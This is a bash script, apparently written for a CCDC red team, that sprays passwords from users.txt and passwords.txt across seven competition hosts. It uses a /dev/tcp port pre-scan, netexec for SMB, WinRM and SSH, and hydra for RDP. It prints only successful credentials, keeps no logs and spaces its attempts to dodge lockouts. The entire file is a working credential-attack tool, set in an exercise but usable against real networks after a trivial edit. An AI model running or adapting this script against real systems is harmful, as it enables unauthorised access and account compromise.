#!/bin/bash
# ================================================
# CCDC Red Team Password Spray Script (netexec)
# Targets: 192.168.20<TEAM>.{140,10,11,70,71,141,72}
# Uses: users.txt + passwords.txt (spray style = 1 pass → all users)
# Protocols: SMB → WinRM → SSH → RDP
# Pre-checks port availability, skips closed services
# Only prints successful creds — no log files
# ================================================

set -euo pipefail

if [[ $# -ne 1 ]]; then
  echo "Usage: $0 <team_number>   (e.g. ./spray.sh 5)"
  exit 1
fi

TEAM="$1"
BASE="192.168.20${TEAM}."
IPS=(
  "${BASE}140"  # curiosity
  "${BASE}10"   # morality
  "${BASE}11"   # intelligence
  "${BASE}70"   # anger
  "${BASE}71"   # fact
  "${BASE}141"  # space
  "${BASE}72"   # adventure
)

USERS="users.txt"
PASSES="passwords.txt"
DOMAIN="aperturesciencelabs.org"
TIMEOUT=2          # seconds for port check
GOT_ACCESS=0       # track if we ever got a successful hit

# Check files exist
if [[ ! -f "$USERS" || ! -f "$PASSES" ]]; then
  echo "[-] ERROR: users.txt or passwords.txt not found in current directory!"
  exit 1
fi

# Check netexec is available
if ! command -v netexec >/dev/null 2>&1; then
  echo "[-] ERROR: netexec not found! Install with: pipx install netexec"
  exit 1
fi

# ============== PORT CHECK ==============
# Returns 0 (open) or 1 (closed). Uses /dev/tcp with timeout.
port_open() {
  local ip="$1" port="$2"
  timeout "$TIMEOUT" bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null
}

# Map protocol → port
proto_port() {
  case "$1" in
    smb)   echo 445 ;;
    winrm) echo 5985 ;;
    ssh)   echo 22 ;;
    rdp)   echo 3389 ;;
  esac
}

# ============== PRE-SCAN: build per-protocol live target lists ==============
declare -A LIVE_TARGETS  # LIVE_TARGETS[proto]="ip1 ip2 ..."

prescan() {
  local proto="$1"
  local port
  port=$(proto_port "$proto")
  local live=()

  for ip in "${IPS[@]}"; do
    if port_open "$ip" "$port"; then
      live+=("$ip")
    fi
  done

  LIVE_TARGETS["$proto"]="${live[*]:-}"
}

echo "[*] Pre-scanning ports on ${#IPS[@]} targets..."

for proto in smb winrm ssh rdp; do
  prescan "$proto"
  count=$(echo "${LIVE_TARGETS[$proto]}" | wc -w)
  port=$(proto_port "$proto")
  if [[ "$count" -gt 0 ]]; then
    echo "  [+] ${proto^^} (port ${port}): ${count} host(s) alive"
  else
    echo "  [-] ${proto^^} (port ${port}): no hosts — will skip"
  fi
done

echo "[*] Starting spray for TEAM ${TEAM} at $(date)"
echo ""

# ============== SPRAY (netexec) ==============
spray_nxc() {
  local proto="$1"
  local targets="${LIVE_TARGETS[$proto]:-}"

  if [[ -z "$targets" ]]; then
    return
  fi

  echo "[*] === ${proto^^} SPRAY ==="

  while IFS= read -r pass || [[ -n "$pass" ]]; do
    [[ -z "$pass" ]] && continue

    for ip in $targets; do
      # Run netexec, only show lines containing [+] (success)
      result=$(netexec "$proto" "$ip" \
        -u "$USERS" \
        -p "$pass" \
        -d "$DOMAIN" \
        --continue-on-success \
        2>/dev/null | grep -i '\[+\]' || true)

      if [[ -n "$result" ]]; then
        echo "$result"
        GOT_ACCESS=1
      fi
    done
    # Small delay between passwords to avoid lockouts
    sleep 3
  done < "$PASSES"
}

# ============== RDP SPRAY (hydra) ==============
spray_rdp() {
  local targets="${LIVE_TARGETS[rdp]:-}"

  if [[ -z "$targets" ]]; then
    return
  fi

  if ! command -v hydra >/dev/null 2>&1; then
    echo "[-] hydra not found — skipping RDP spray"
    return
  fi

  echo "[*] === RDP SPRAY ==="

  while IFS= read -r pass || [[ -n "$pass" ]]; do
    [[ -z "$pass" ]] && continue

    for ip in $targets; do
      result=$(hydra -L "$USERS" -p "$pass" -t 4 -W 2 rdp://"$ip" 2>/dev/null \
        | grep -i 'login:' || true)

      if [[ -n "$result" ]]; then
        echo "$result"
        GOT_ACCESS=1
      fi
    done
    sleep 5
  done < "$PASSES"
}

# ============== RUN IN ORDER ==============
spray_nxc smb
spray_nxc winrm
spray_nxc ssh
spray_rdp

echo ""
if [[ "$GOT_ACCESS" -eq 0 ]]; then
  echo "access denied!"
else
  echo "[*] Spray complete — see hits above."
fi